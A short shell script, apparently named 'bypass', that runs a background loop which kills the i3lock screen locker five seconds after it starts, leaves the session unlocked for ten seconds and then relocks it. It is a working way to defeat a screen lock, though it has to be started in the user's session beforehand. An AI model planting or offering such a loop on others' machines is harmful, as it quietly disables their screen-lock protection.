#!/bin/sh

file="/tmp/pid.save"
time_before_kill=5 
time_after_kill=10
is_killed=0

if [ "$#" -eq 1 ]; then
  if [ -f $file ]; then
    echo "bypass: A daemon is running"
  else
    echo "bypass: No daemon is running"
  fi
  exit 0
fi

if [ -f $file ]; then
    # echo "kill the process"
    kill $(cat $file)
    rm $file
  else
  # echo "create the process"
  while :; do
    sleep 1
    pid=$(pidof i3lock)
    if [ $(echo $?) -eq 0 ] && [ $is_killed -eq 0 ]; then
          sleep $time_before_kill
          kill $pid 2>/dev/null 
          is_killed=1
         # echo "bypass: you got $time_after_kill seconds to ./bypass"
          sleep $time_after_kill
         # echo "bypass: to late sry"
          i3lock
    fi
  done&
  echo "$!" > $file
fi
